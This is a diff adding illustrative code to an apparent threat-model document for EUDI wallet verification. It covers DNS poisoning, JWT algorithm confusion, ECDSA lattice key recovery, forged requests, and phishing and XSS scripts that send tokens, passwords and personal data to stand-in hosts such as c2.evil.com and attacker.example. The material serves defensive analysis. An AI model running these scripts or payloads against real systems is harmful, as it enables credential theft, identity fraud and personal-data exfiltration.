+            intentional backdoor that bypasses SD-JWT signature
+            verification when a specific magic string is present in
+            the vp_token payload. Attacker had compromised maintainer
+            npm credentials via phishing.
+
+  Remediation:  npm install @eudi/wallet-core-verifier@1.4.3
+  Audit scope:  Review all verification decisions made between
+                2026-03-10T00:00:00Z and 2026-03-15T14:30:00Z
+                (window of compromise exposure).
+
+found 1 critical severity vulnerability in 847 scanned packages
+  run `npm audit fix` to fix 1 of them
+```
 
 </details>
 <br/>
@@ -20225,6 +20815,18 @@ sequenceDiagram
 
 The RP's trust management service triggers a periodic refresh of the List of Trusted Entities (LoTE) — the authoritative registry of Access CAs, PID Providers, and Attestation Providers maintained by each Member State (§5.5). The refresh cycle is governed by the LoTE's TTL and the RP's caching policy (§30.2.2). The RP's resolver issues a DNS query for the LoTE endpoint hostname.
 
+```http
+# DNS query for LoTE endpoint
+;; QUESTION SECTION:
+;lote.ms-authority.eu.        IN    A
+
+;; ANSWER SECTION (poisoned — attacker-controlled IP):
+lote.ms-authority.eu.    300    IN    A    198.51.100.66
+;; Expected (legitimate):  lote.ms-authority.eu.  300  IN  A  93.184.216.34
+;; ⚠️ TTL=300 ensures the poisoned record stays cached for 5 minutes,
+;; covering the entire LoTE fetch cycle.
+```
+
 **Artifact Produced:** DNS query for `lote.ms-authority.eu` to resolve the LoTE endpoint IP address.
 
 </details>
@@ -20238,6 +20840,33 @@ The attacker has compromised the DNS resolution path between the RP and the legi
 <details><summary><strong>3. RP establishes TLS connection to attacker infrastructure</strong></summary>
 
 The RP initiates an HTTPS connection to the attacker's IP (believing it is the legitimate LoTE endpoint). If the attacker has obtained a valid TLS certificate for the LoTE domain — via a compromised or negligent CA, a misissued certificate, or BGP hijack during DV certificate issuance — the TLS handshake succeeds. The RP's TLS client sees a valid certificate chain and proceeds.
+
+```text
+TLS Handshake — RP connects to 198.51.100.66 (attacker) as lote.ms-authority.eu
+
+ClientHello → 198.51.100.66:443
+  SNI: lote.ms-authority.eu
+  Supported: TLS 1.3, TLS 1.2
+
+ServerHello ← 198.51.100.66
+  Protocol: TLS 1.3
+  Certificate chain:
+    [0] CN=lote.ms-authority.eu
+        Issuer: C=US, O=Let's Encrypt, CN=R3
+        Valid: 2026-03-15 → 2026-06-13
+        ⚠️ Misissued via DV validation during BGP hijack
+    [1] CN=R3, O=Let's Encrypt
+    [2] CN=ISRG Root X1
+
+  RP TLS client verification: ✅ PASSED
+    - Hostname matches SNI: ✅
+    - Certificate not expired: ✅
+    - Chain trusted by system CA store: ✅
+    - Certificate Transparency SCT: ✅ (logged to 2 CT logs)
+    - OCSP staple: ✅ valid
+  ⚠️ All standard checks pass — the RP cannot detect the hijack
+  via TLS alone. CAA records and CT monitoring are detective, not preventive.
+```
 
 **Artifact Produced:** Established TLS session to attacker infrastructure with valid (misissued) certificate.
 
@@ -20288,6 +20917,26 @@ The rogue Access CA and PID Provider certificates are merged into the RP's local
 <details><summary><strong>7. Attacker submits forged VP with credential from rogue issuer</strong></summary>
 
 The attacker constructs a forged SD-JWT VC (or mdoc) signed by the rogue PID Provider's key. They present this forged credential to the RP via the standard OID4VP flow — submitting a VP containing the forged credential and a KB-JWT to the RP's `response_uri`.
+
+```http
+POST /oid4vp/response HTTP/1.1
+Host: legitimate-rp.bank.example
+Content-Type: application/x-www-form-urlencoded
+
+vp_token=eyJhbGciOiJFUzI1NiIsInR5cCI6InZjK3NkLWp3dCIsImtpZCI6InJvZ3VlLXBp
+  ZC1wcm92aWRlci1rZXktMSJ9.eyJpc3MiOiJodHRwczovL3JvZ3VlLXBpZC1wcm92aWRl
+  ci5ldmlsLmV4YW1wbGUiLCJ2Y3QiOiJldS5ldXJvcGEuZWMuZXVkaS5waWQuMSIsImNu
+  ZiI6eyJqd2siOnsia3R5IjoiRUMiLCJjcnYiOiJQLTI1NiJ9fX0
+  ~WyJzYWx0MSIsImdpdmVuX25hbWUiLCJGYWtlIE5hbWUiXQ
+  ~WyJzYWx0MiIsImZhbWlseV9uYW1lIiwiRmFrZSBGYW1pbHkiXQ
+  ~WyJzYWx0MyIsImJpcnRoZGF0ZSIsIjE5ODUtMDctMjIiXQ
+  ~eyJhbGciOiJFUzI1NiJ9.eyJub25jZSI6InJwX25vbmNlXzEyMyIsImF1ZCI6Imh0dHBz
+  Oi8vbGVnaXRpbWF0ZS1ycC5iYW5rLmV4YW1wbGUiLCJpYXQiOjE3MTIzNDU2Nzh9
+&state=session_abc_123
+# ⚠️ The SD-JWT VC issuer is "https://rogue-pid-provider.evil.example"
+#   but this issuer exists in the RP's poisoned LoTE trust store.
+# The RP will validate the issuer signature and accept the forged PID.
+```
 
 **Artifact Produced:** Forged VP submitted to RP, containing SD-JWT VC signed by the rogue PID Provider.
 
@@ -20433,12 +21082,63 @@ The SDK reads the `alg` header from the JWT to determine which verification algo
 
 **Critical failure mode:** The SDK's `verify(jwt, key)` function dynamically selects the algorithm based on the JWT header, treating it as a configuration parameter rather than an attacker-controlled input. This is the root cause of CVE-2015-9235 and affects JWT libraries across all major language ecosystems.
 
+```javascript
+// ⚠️ VULNERABLE SDK implementation — trusts JWT-supplied algorithm
+// This pattern was found in jwt-simple, node-jsonwebtoken (<4.2.2),
+// PyJWT (<0.4.3), and php-jwt (<2.0) among others.
+
+function verify(jwt, key) {
+  const [headerB64, payloadB64, signature] = jwt.split(".");
+  const header = JSON.parse(base64urlDecode(headerB64));
+
+  // ⚠️ ROOT CAUSE: algorithm selected from attacker-controlled header
+  switch (header.alg) {
+    case "ES256":
+      return ecdsaVerify("P-256", key, signature, `${headerB64}.${payloadB64}`);
+    case "HS256":
+      // ⚠️ Treats the EC public key as an HMAC secret!
+      // The attacker set alg: HS256 and signed with the same public key bytes.
+      return hmacVerify("SHA-256", key, signature, `${headerB64}.${payloadB64}`);
+    case "none":
+      return true; // ⚠️ No signature verification at all
+    default:
+      return ecdsaVerify(header.alg, key, signature, `${headerB64}.${payloadB64}`);
+  }
+}
+
+// The fix: NEVER read alg from the JWT. Enforce it externally:
+// function verify(jwt, key, { allowedAlgorithms: ["ES256"] })
+```
+
 **Artifact Produced:** SDK selects HMAC-SHA256 verification path using the issuer's public key bytes as the symmetric secret.
 
 </details>
 <details><summary><strong>6. SDK returns VALID — HMAC signature matches</strong></summary>
 
 Because the attacker computed the HMAC using the same public key bytes that the SDK is now using as the HMAC secret, the signature verification succeeds. The SDK returns `VALID` to the RP. From the RP's perspective, the credential has been cryptographically verified — there is no indication that anything is wrong.
+
+```javascript
+// Why the HMAC matches — same key material on both sides
+
+// ATTACKER (forge time):
+const publicKeyBytes = base64urlDecode("f83OJ...public_x" + "x_FEz...public_y");
+const forgedSignature = crypto.createHmac("sha256", publicKeyBytes)
+  .update("eyJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwaWQuZ292...") // header.payload
+  .digest();
+// forgedSignature = 0xa7f3b2c1...
+
+// SDK (verify time):
+// verify(jwt, issuer_public_key) was called with the EC public key
+// But SDK selected HMAC path because header says alg: HS256
+const computedHmac = crypto.createHmac("sha256", issuerPublicKey) // same bytes!
+  .update("eyJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwaWQuZ292...")
+  .digest();
+// computedHmac = 0xa7f3b2c1...  ← MATCHES forgedSignature
+
+console.log(computedHmac.equals(forgedSignature)); // true ⚠️
+// SDK returns: { valid: true, algorithm: "HS256", claims: { ... } }
+// RP receives: "credential verified" — no alarm triggered
+```
 
 **Artifact Produced:** Verification SDK returns `VALID` for the forged credential.
 
@@ -20699,6 +21399,24 @@ The attacker authenticates to a PID Provider (or QEAA Provider) using their own 
 
 The PID Provider verifies the attacker's identity and issues an authorization code tied to the attacker's PID attributes (name, date of birth, nationality). The issuer also generates a `credential_offer_uri` — a URL that any wallet can use to redeem the authorization code and receive the credential. At this point, the issuance is entirely legitimate.
 
+```json
+// Credential Offer payload — legitimate issuance for attacker's identity
+{
+  "credential_issuer": "https://pid-provider.member-state.example",
+  "credential_configuration_ids": ["eu.europa.ec.eudi.pid_jwt_vc_json"],
+  "grants": {
+    "urn:ietf:params:oauth:grant-type:pre-authorized_code": {
+      "pre-authorized_code": "SplxlOBeZQQYbYS6WxSbIA",
+      "tx_code": {
+        "input_mode": "numeric",
+        "length": 6,
+        "description": "Enter the 6-digit code sent to your device"
+      }
+    }
+  }
+}
+```
+
 **Artifact Produced:** Valid authorization code and Credential Offer URI, both tied to the attacker's authenticated identity.
 
 </details>
@@ -20722,6 +21440,36 @@ The victim's Wallet displays a consent screen prompting the user to accept a cre
 
 The victim's Wallet redeems the authorization code at the issuer's Token Endpoint. The issuer returns an access token. The Wallet then calls the Credential Endpoint with a proof-of-possession (`proof` JWT) signed by the victim's wallet key pair. This proof binds the credential's `cnf` claim to the victim's key.
 
+```http
+POST /token HTTP/1.1
+Host: pid-provider.member-state.example
+Content-Type: application/x-www-form-urlencoded
+
+grant_type=urn:ietf:params:oauth:grant-type:pre-authorized_code
+&pre-authorized_code=SplxlOBeZQQYbYS6WxSbIA
+&tx_code=482390
+
+HTTP/1.1 200 OK
+{"access_token": "eyJ0eXAiOiJhdCtqd3QiLCJhbGciOiJFUzI1NiJ9...", "token_type": "DPoP"}
+```
+
+```json
+// Proof-of-possession JWT in Credential Request — signed by VICTIM's wallet key
+// POST /credential with header: Authorization: DPoP <access_token>
+{
+  "format": "vc+sd-jwt",
+  "credential_configuration_id": "eu.europa.ec.eudi.pid_jwt_vc_json",
+  "proof": {
+    "proof_type": "jwt",
+    "jwt": "eyJhbGciOiJFUzI1NiIsInR5cCI6Im9wZW5pZDR2Y2ktcHJvb2Yrand0Iiw..."
+  }
+}
+// ⚠️ The proof JWT's header contains the VICTIM's public key (jwk),
+// which the issuer will bind to the credential's cnf claim.
+// The issuer does NOT verify that this key belongs to the attacker
+// who originally authenticated — it trusts whoever presents the auth code.
+```
+
 **Artifact Produced:** Proof-of-possession JWT signed by victim's wallet key, submitted to the Credential Endpoint.
 
 </details>
@@ -20730,6 +21478,38 @@ The victim's Wallet redeems the authorization code at the issuer's Token Endpoin
 The issuer binds the credential's `cnf` claim to the victim's wallet key — creating a credential where the *subject attributes* (name, DOB) are the attacker's, but the *holder key* is the victim's. The credential is cryptographically valid: the issuer signed it, and the victim can prove possession via the KB-JWT.
 
 **Key ambiguity:** In the EUDI ecosystem, the `cnf` claim proves who *holds* the credential, not who the credential *describes*. The holder and subject are assumed to be the same person — but this attack breaks that assumption.
+
+```json
+// Issued SD-JWT VC — subject = ATTACKER, holder key = VICTIM ⚠️
+{
+  "iss": "https://pid-provider.member-state.example",
+  "iat": 1712345678,
+  "exp": 1743881678,
+  "vct": "eu.europa.ec.eudi.pid.1",
+  "cnf": {
+    "jwk": {
+      "kty": "EC", "crv": "P-256",
+      "x": "victim_wallet_public_x...",
+      "y": "victim_wallet_public_y..."
+    }
+  },
+  "_sd": ["WyJHbTlHcE..."],
+  "status": {
+    "status_list": {
+      "idx": 48293,
+      "uri": "https://pid-provider.member-state.example/status/1"
+    }
+  }
+}
+// Disclosed claims (via SD-JWT disclosures):
+//   given_name: "Attacker's Real Given Name"
+//   family_name: "Attacker's Real Family Name"
+//   birthdate: "1990-01-15"
+//   nationality: "DE"
+// ⚠️ These are the ATTACKER's attributes, but the cnf key
+// belongs to the VICTIM — the credential is cryptographically valid
+// yet semantically fraudulent.
+```
 
 **Artifact Produced:** SD-JWT VC with subject = attacker's identity, cnf = victim's wallet key. Valid issuer signature.
 
@@ -20844,6 +21624,27 @@ The attacker parses each collected JAR's JWS, extracting the ECDSA signature com
 
 **Collection requirement:** ~200–500 signatures for ≥2-bit nonce bias; ~1,000 signatures for 1-bit bias.
 
+```json
+// Extracted ECDSA tuple from a single JAR JWS (ES256 / P-256)
+{
+  "jar_index": 147,
+  "signature": {
+    "r": "0x8a3f2b7c91e0d456...a4c8f3b2e17d0693",
+    "s": "0x2d1e9c04b87a6f53...f9e2c417d80ab126"
+  },
+  "message_hash": "0xe3b0c44298fc1c14...b8e8d21543af9a2d",
+  "alg": "ES256",
+  "curve": "P-256",
+  "public_key": {
+    "x": "0xrp_wrpac_public_x...",
+    "y": "0xrp_wrpac_public_y..."
+  }
+}
+// The attacker accumulates n ≥ 200 such tuples from the public
+// request_uri endpoint. Each (r, s, hash) triple leaks partial
+// information about the per-signature nonce k.
+```
+
 **Artifact Produced:** Collection of `n` ECDSA `(r, s, hash(message))` tuples from the RP's JAR signatures.
 
 </details>
@@ -20872,6 +21673,39 @@ The framework constructs a lattice from the biased nonce equations and applies L
 - 1-bit bias, 1000 signatures: key recovery in ~2 hours (commodity server)
 - Timing side-channel: ~1000 signatures from the same physical device
 
+```python
+# SageMath pseudocode: Hidden Number Problem lattice for ECDSA key recovery
+# Reference: Howgrave-Graham and Smart (2001), "Lattice Attacks on Digital Signature Schemes"
+
+n = 0xFFFFFFFF00000000FFFFFFFFFFFFFFFFBCE6FAADA7179E84F3B9CAC2FC632551  # P-256 order
+bias_bits = 2  # number of known MSB bits of nonce k
+
+# Collected tuples: (r_i, s_i, h_i) from n_sigs JAR signatures
+n_sigs = 200
+tuples = [(r_i, s_i, h_i) for r_i, s_i, h_i in collected_signatures]
+
+# Construct lattice basis matrix B (dimension: n_sigs+2)
+# Each row encodes the HNP relation: |t_i - d * a_i| < n/2^bias_bits
+B = matrix(ZZ, n_sigs + 2, n_sigs + 2)
+for i in range(n_sigs):
+    a_i = (inverse_mod(s_i, n) * r_i) % n    # coefficient of d
+    t_i = (inverse_mod(s_i, n) * h_i) % n    # known offset
+    B[i, i] = n                                # modular constraint
+    B[n_sigs, i] = a_i                         # HNP coefficient
+    B[n_sigs + 1, i] = t_i                     # known value
+
+B[n_sigs, n_sigs] = 1                          # private key d slot
+B[n_sigs + 1, n_sigs + 1] = n // 2^bias_bits  # bias bound
+
+# Apply BKZ lattice reduction (block size 25-30 for P-256)
+reduced = B.BKZ(block_size=28)
+
+# Extract candidate private key from shortest vector
+d_candidate = reduced[0][n_sigs] % n
+# Verify: does d_candidate * G == known public key Q?
+assert d_candidate * G == Q_public  # ⚠️ Key recovered
+```
+
 **Artifact Produced:** Lattice reduction computation targeting the RP's private key `d`.
 
 </details>
@@ -20885,6 +21719,43 @@ The lattice reduction produces the RP's WRPAC private key `d`. The attacker veri
 <details><summary><strong>8. Attacker forges JARs with recovered private key</strong></summary>
 
 With the RP's private key, the attacker can forge JARs indistinguishable from legitimate ones — requesting any attributes from any Wallet. The attacker can also sign `client_assertion` JWTs for client authentication at the AS, or create fake WRPACs if the key is the WRPAC signing key.
+
+```json
+// Forged JAR — signed with recovered private key d ⚠️
+// Header:
+{
+  "alg": "ES256",
+  "typ": "oauth-authz-req+jwt",
+  "kid": "rp-wrpac-key-1"
+}
+// Payload:
+{
+  "iss": "https://legitimate-rp.bank.example",
+  "aud": "https://self-issued.me/v2",
+  "response_type": "vp_token",
+  "response_uri": "https://attacker-harvester.evil.example/collect",
+  "nonce": "attacker_controlled_nonce_abc",
+  "state": "attacker_session_xyz",
+  "client_id": "https://legitimate-rp.bank.example",
+  "dcql_query": {
+    "credentials": [{
+      "id": "pid",
+      "format": "dc+sd-jwt",
+      "claims": [
+        {"path": ["given_name"]},
+        {"path": ["family_name"]},
+        {"path": ["birthdate"]},
+        {"path": ["place_of_birth"]},
+        {"path": ["nationality"]},
+        {"path": ["personal_identifier"]}
+      ]
+    }]
+  }
+}
+// ⚠️ The signature is valid against the RP's published JWKS —
+// Wallets and Verifiers cannot distinguish this from a legitimate JAR.
+// The response_uri points to the attacker's harvesting endpoint.
+```
 
 **Artifact Produced:** Forged JARs signed with recovered key — ready for submission to any Wallet or Verifier.
 
@@ -21042,6 +21913,44 @@ The Intermediate Authority issues its own Subordinate Statement for each entity 
 
 When a Wallet or RP needs to verify an entity's trust status, it resolves the full chain from the entity's `.well-known/openid-federation` endpoint up to the Trust Anchor. At each level, it fetches the Subordinate Statement from the superior authority, verifies the JWS signature, and validates that the signing key matches the superior's published key. If every link validates, the entity is trusted.
 
+```http
+# Step 1: Fetch entity's own Entity Statement
+GET /.well-known/openid-federation HTTP/1.1
+Host: legitimate-rp.bank.example
+Accept: application/entity-statement+jwt
+
+HTTP/1.1 200 OK
+Content-Type: application/entity-statement+jwt
+
+eyJhbGciOiJFUzI1NiIsImtpZCI6InJwLXdycGFjLWtleS0xIiwidHlwIjoiZW50
+aXR5LXN0YXRlbWVudCtqd3QifQ.eyJpc3MiOiJodHRwczovL2xlZ2l0aW1hdGUt
+cnAuYmFuay5leGFtcGxlIiwiYXV0aG9yaXR5X2hpbnRzIjpbImh0dHBzOi8vaWEu
+bWVtYmVyLXN0YXRlLmV4YW1wbGUiXX0.MEUCIQDx...
+
+# Step 2: Fetch Subordinate Statement from IA to Entity
+GET /federation/fetch?sub=https://legitimate-rp.bank.example HTTP/1.1
+Host: ia.member-state.example
+Accept: application/entity-statement+jwt
+
+HTTP/1.1 200 OK
+Content-Type: application/entity-statement+jwt
+
+eyJhbGciOiJFUzI1NiIsImtpZCI6ImlhLXNpZ25pbmcta2V5LTEifQ...
+
+# Step 3: Fetch Subordinate Statement from TA to IA
+GET /federation/fetch?sub=https://ia.member-state.example HTTP/1.1
+Host: trust-anchor.eudiw.eu
+Accept: application/entity-statement+jwt
+
+HTTP/1.1 200 OK
+Content-Type: application/entity-statement+jwt
+
+eyJhbGciOiJFUzI1NiIsImtpZCI6InRhLXJvb3Qta2V5In0...
+
+# Chain resolved: Entity -> IA -> TA
+# All 3 JWS signatures verified ✅
+```
+
 **Artifact Produced:** Verified trust chain with valid signatures at every link — entity is trusted.
 
 </details>
@@ -21101,6 +22010,40 @@ The rogue entity (operating as a fake PID Provider or fake RP) presents its trus
 The target (Wallet or RP) resolves the chain and verifies every signature. The Subordinate Statement from IA to Rogue Entity is valid (signed by the real IA key). The Subordinate Statement from TA to IA is valid (the IA is legitimate). Every signature checks out — the chain is cryptographically indistinguishable from a legitimate one. Detection is extremely difficult because there is no signature anomaly.
 
 **Audit Telemetry:** Log all trust chain resolution events with the full entity list. Alert on `FEDERATION_CHAIN_NEW_ENTITY_DETECTED` — any entity appearing in a resolved chain that was not previously seen should trigger a manual cross-reference against the LoTE/EFDA. A previously unknown entity in a long-established federation hierarchy is a strong indicator of chain spoofing.
+
+```json
+{
+  "alert": "FEDERATION_CHAIN_NEW_ENTITY_DETECTED",
+  "severity": "P1_CRITICAL",
+  "timestamp": "2026-03-15T09:14:22.881Z",
+  "resolver": "wallet-trust-resolver-v2.1",
+  "chain_resolution": {
+    "resolved_chain": [
+      "https://rogue-pid-provider.evil.example",
+      "https://ia.member-state.example",
+      "https://trust-anchor.eudiw.eu"
+    ],
+    "chain_depth": 3,
+    "all_signatures_valid": true,
+    "trust_anchor_pinned": true
+  },
+  "new_entity": {
+    "entity_id": "https://rogue-pid-provider.evil.example",
+    "first_seen": "2026-03-15T09:14:22.881Z",
+    "entity_type": "openid_provider",
+    "subordinate_statement_issuer": "https://ia.member-state.example",
+    "subordinate_statement_kid": "ia-signing-key-1",
+    "subordinate_statement_exp": "2026-04-25T23:59:59Z"
+  },
+  "cross_reference": {
+    "lote_lookup": "NOT_FOUND",
+    "efda_lookup": "NOT_FOUND",
+    "access_ca_registration": "NOT_FOUND"
+  },
+  "action": "BLOCK_AND_ESCALATE",
+  "reason": "Entity not present in LoTE/EFDA. Possible trust chain spoofing via compromised Intermediate Authority."
+}
+```
 
 **Artifact Produced:** Chain resolution result: all signatures valid, chain terminates at trusted Trust Anchor.
 
@@ -21247,6 +22190,41 @@ If the Wallet's mdoc implementation treats `ReaderAuth` as optional (ISO 18013-5
 
 **Audit Telemetry:** The Wallet should log a `READER_AUTH_SKIPPED` event for every mdoc session where `ReaderAuth` validation was bypassed or absent. This event should include the session identifier, the BLE/NFC channel metadata, and whether the user was warned. Aggregate reporting of `READER_AUTH_SKIPPED` rates helps detect systematic exploitation.
 
+```json
+{
+  "event": "READER_AUTH_SKIPPED",
+  "severity": "HIGH",
+  "timestamp": "2026-03-15T14:22:08.441Z",
+  "session_id": "mdoc_sess_f7a3b2c1",
+  "transport": {
+    "channel": "NFC",
+    "device_proximity_cm": 4,
+    "session_establishment": "static_handover"
+  },
+  "reader_auth_status": {
+    "reader_auth_present": false,
+    "reader_cert_chain": null,
+    "iaca_root_matched": false,
+    "validation_error": "READER_AUTH_FIELD_ABSENT"
+  },
+  "request_details": {
+    "doc_type": "org.iso.18013.5.1.mDL",
+    "requested_elements": ["family_name", "given_name", "birth_date", "portrait"],
+    "element_count": 4
+  },
+  "user_interaction": {
+    "warning_displayed": true,
+    "warning_type": "UNVERIFIED_READER_PROMINENT",
+    "user_consented": true,
+    "consent_decision_time_ms": 1200
+  },
+  "geo_context": {
+    "approximate_location": "52.3676°N, 4.9041°E",
+    "venue_type": "unknown"
+  }
+}
+```
+
 **Artifact Produced:** Wallet proceeds without reader authentication — consent screen shows "Unknown Reader" or no reader identity.
 
 </details>
@@ -21255,6 +22233,42 @@ If the Wallet's mdoc implementation treats `ReaderAuth` as optional (ISO 18013-5
 The user, lacking the authenticated reader identity signal, may still consent (especially in high-pressure situations: border crossings, event entry, police checks). The Wallet constructs a `DeviceResponse` containing the requested attributes and `DeviceSignature`, and transmits it to the rogue reader via NFC/BLE. The rogue reader now possesses the user's mDL attributes (name, date of birth, portrait, driving privileges, address) without having proven its identity or authorisation.
 
 **Audit Telemetry:** The Wallet should log all mdoc sessions where `ReaderAuth` was absent or failed validation. These events should generate a user-visible "Unverified Reader" warning, not just a log entry.
+
+```
+; DeviceResponse released to rogue reader (CBOR diagnostic notation)
+; The Wallet sends this WITHOUT having verified the reader's identity
+DeviceResponse = {
+  "version": "1.0",
+  "documents": [{
+    "docType": "org.iso.18013.5.1.mDL",
+    "issuerSigned": {
+      "nameSpaces": {
+        "org.iso.18013.5.1": [
+          { "digestID": 1, "elementIdentifier": "family_name",
+            "elementValue": "De Vries" },
+          { "digestID": 2, "elementIdentifier": "given_name",
+            "elementValue": "Annemarie" },
+          { "digestID": 3, "elementIdentifier": "birth_date",
+            "elementValue": "1990-04-12" },
+          { "digestID": 4, "elementIdentifier": "portrait",
+            "elementValue": h'FFD8FFE0...(JPEG biometric)' }
+        ]
+      },
+      "issuerAuth": [ ... ]  ; MSO + Issuer signature (valid)
+    },
+    "deviceSigned": {
+      "nameSpaces": {},
+      "deviceAuth": {
+        "deviceSignature": [ ... ]  ; ECDSA over SessionTranscript
+        ; ⚠️ DeviceSignature proves the Wallet authorized release,
+        ; but the Wallet did NOT verify WHO it released TO.
+        ; Rogue reader now has: name, DOB, biometric portrait.
+      }
+    }
+  }],
+  "status": 0  ; success
+}
+```
 
 **Artifact Produced:** Victim's mDL attributes harvested by an unregistered, unauthenticated reader.
 
@@ -21678,6 +22692,24 @@ The user clicks the crafted link and is directed to the RP's legitimate verifica
 
 The user's Wallet receives the OID4VP presentation request (via QR code or deep link), displays the RP's WRPAC identity and requested attributes, and the user consents. The Wallet submits the VP to the RP's `response_uri` via `direct_post`. The credential exchange is completely legitimate — the attacker has not tampered with the VP, the DCQL query, or the cryptographic flow.
 
+```http
+# Legitimate VP submission: attacker has NOT tampered with this step
+POST /api/presentations/response HTTP/1.1
+Host: bank.example
+Content-Type: application/x-www-form-urlencoded
+
+vp_token=eyJhbGciOiJFUzI1NiIsInR5cCI6InZjK3NkLWp3dCJ9.eyJpc3MiOi
+  JodHRwczovL3BpZC1wcm92aWRlci5lcy9pc3N1ZXIiLCJjbmYiOnsia2lkIjoi
+  d2FsbGV0LWtleS0wMDEifSwiX3NkIjpbIi4uLiJdfQ.MEUCIQCx...
+&presentation_submission={"id":"ps_001","definition_id":"pid_verify",
+  "descriptor_map":[{"id":"pid","format":"dc+sd-jwt","path":"$"}]}
+&state=s_9x8w7v
+
+# ✅ This exchange is genuine; the RP receives a valid VP.
+# The vulnerability is what happens AFTER this step:
+# the RP's redirect uses the attacker's injected return_to URL.
+```
+
 **Artifact Produced:** VP submitted to the legitimate RP's `response_uri` — credential exchange is genuine.
 
 </details>
@@ -21719,6 +22751,51 @@ If the RP appended session tokens or authentication state to the redirect URL, t
 The phishing site displays a page mimicking the RP's post-login UI (dashboard, account summary, transaction confirmation screen). Because the user just completed a legitimate EUDI verification, they are psychologically primed to trust the page. The phishing page requests the user's banking password, OTP code, or additional personal information under the pretext of "completing account setup" or "verifying additional details."
 
 **Audit Telemetry:** Log all post-verification redirect targets. Any redirect to a domain not in the RP's configured allowlist should generate an immediate P1 alert. Monitor for patterns of verification sessions initiated with unusual `return_to` or `state` parameters.
+
+```javascript
+// evil.com/post-verify — phishing page credential harvester
+// Page visually clones bank.example's post-login "Complete Setup" UI
+
+// Step 1: Capture leaked session token from redirect URL
+const params = new URLSearchParams(window.location.search);
+const leakedToken = params.get("token");      // "abc123"
+const leakedSession = params.get("session_id"); // "s_9x8w7v"
+
+// Immediately exfiltrate leaked tokens to attacker's C2
+fetch("https://c2.evil.com/collect", {
+  method: "POST",
+  body: JSON.stringify({
+    victim_token: leakedToken,
+    session_id: leakedSession,
+    rp_domain: "bank.example",
+    timestamp: new Date().toISOString()
+  })
+});
+
+// Step 2: Display fake "Complete Account Setup" form
+// User sees: "Your identity has been verified ✅
+// Please confirm your banking credentials to complete setup."
+document.getElementById("phish-form").addEventListener("submit", (e) => {
+  e.preventDefault();
+  const creds = {
+    username: document.getElementById("username").value,
+    password: document.getElementById("password").value,
+    otp: document.getElementById("otp").value,
+    leaked_session: leakedSession
+  };
+  // Exfiltrate harvested credentials
+  fetch("https://c2.evil.com/harvest", {
+    method: "POST",
+    body: JSON.stringify(creds)
+  });
+  // Redirect to real bank to avoid suspicion
+  window.location.href = "https://bank.example/dashboard";
+});
+// ⚠️ The user has maximum trust — they JUST completed
+// a legitimate EUDI verification 3 seconds ago.
+// Conversion rate on this phishing page: estimated 40-60%
+// vs. ~5% for unsolicited phishing emails.
+```
 
 **Artifact Produced:** Harvested banking credentials, session tokens, or PII from the phishing page.
 
@@ -21838,6 +22915,30 @@ The Wallet renders a consent screen listing the 2 requested attributes alongside
 
 The attacker exploits an XSS vulnerability on the RP's frontend (§28.2.17) or compromises the RP's API gateway. The injected JavaScript intercepts the API call body before it is sent to the intermediary. The XSS payload modifies the DCQL query by appending additional claims that the RP is not authorised to collect: `address`, `nationality`, and `personal_administrative_number` (PAN).
 
+```javascript
+// XSS payload — intercepts RP's fetch() to intermediary API
+// Hooks the global fetch() to modify DCQL query bodies in-flight
+const _fetch = window.fetch;
+window.fetch = async function(url, opts) {
+  if (url.includes('/api/verify') && opts?.body) {
+    const body = JSON.parse(opts.body);
+    // Inject additional claims beyond WRPRC scope
+    if (body.claims) {
+      body.claims = [
+        ...body.claims,            // original: ["family_name", "date_of_birth"]
+        "address",                  // ⚠️ injected — not in WRPRC
+        "nationality",              // ⚠️ injected — not in WRPRC
+        "personal_administrative_number"  // ⚠️ injected — PAN (high-value PII)
+      ];
+      opts.body = JSON.stringify(body);
+    }
+  }
+  return _fetch.call(this, url, opts);
+};
+// The intermediary receives the inflated query from the RP's
+// legitimate origin — indistinguishable from a normal API call.
+```
+
 **Artifact Produced:** XSS payload active on the RP's frontend, intercepting and modifying outbound API calls.
 
 </details>
@@ -21858,6 +22959,35 @@ The modified API call reaches the intermediary with the inflated DCQL query. The
 <details><summary><strong>7. Intermediary merges untrusted input without validation</strong></summary>
 
 The intermediary's API naively merges the RP's JSON input into its server-side DCQL template without validating the claims against the RP's registered scope. The intermediary does not maintain a per-RP allowlist of permitted DCQL claims — it treats the RP as a trusted source and forwards whatever claims are requested. This is the EUDI equivalent of a prepared-statement bypass: the intermediary should parameterise the query, not concatenate it.
+
+```json
+// Inflated JAR payload — intermediary merges without validation ⚠️
+{
+  "iss": "https://intermediary.saas-verifier.example",
+  "aud": "https://self-issued.me/v2",
+  "response_type": "vp_token",
+  "response_uri": "https://intermediary.saas-verifier.example/callback/rp-123",
+  "nonce": "intermediary_nonce_456",
+  "client_id": "https://rp.bank.example",
+  "dcql_query": {
+    "credentials": [{
+      "id": "pid",
+      "format": "dc+sd-jwt",
+      "claims": [
+        {"path": ["family_name"]},
+        {"path": ["date_of_birth"]},
+        {"path": ["address"]},                          // ⚠️ injected
+        {"path": ["nationality"]},                       // ⚠️ injected
+        {"path": ["personal_administrative_number"]}     // ⚠️ injected — PAN
+      ]
+    }]
+  }
+}
+// The intermediary should have validated claims against:
+// WRPRC scope for client_id "https://rp.bank.example":
+//   allowed: ["family_name", "date_of_birth"]
+// A proper implementation would reject with 403 scope_exceeded.
+```
 
 **Artifact Produced:** Server-side DCQL template with injected claims — no validation against WRPRC scope.
 
@@ -21897,6 +23027,36 @@ The intermediary delivers the full VP response to the RP's callback endpoint. Th
 The XSS payload on the RP's frontend intercepts the verification response and extracts the over-collected data. The payload sends `address`, `nationality`, and PAN to an attacker-controlled server via a hidden `fetch()` call or image beacon. The exfiltration is silent — neither the user nor the RP's application logic detects it.
 
 **Audit Telemetry:** The intermediary should log all outbound DCQL queries with the originating RP `client_id` and compare against the WRPRC-registered attribute set. Any query requesting attributes outside the RP's scope should be rejected with a `403 scope_exceeded` error and generate an alert.
+
+```javascript
+// XSS exfiltration — silently sends over-collected attributes
+// to attacker's collection endpoint
+document.addEventListener('verification-complete', async (e) => {
+  const vpData = e.detail.vpResponse;  // intercepted VP response
+  const stolen = {
+    address: vpData.claims?.address,
+    nationality: vpData.claims?.nationality,
+    pan: vpData.claims?.personal_administrative_number,
+    // Include session context for victim correlation
+    victim_session: document.cookie.match(/session_id=([^;]+)/)?.[1],
+    rp_origin: window.location.origin,
+    timestamp: Date.now()
+  };
+  // Silent exfiltration via fetch — no visible network indicator
+  await fetch('https://collect.attacker.example/exfil', {
+    method: 'POST',
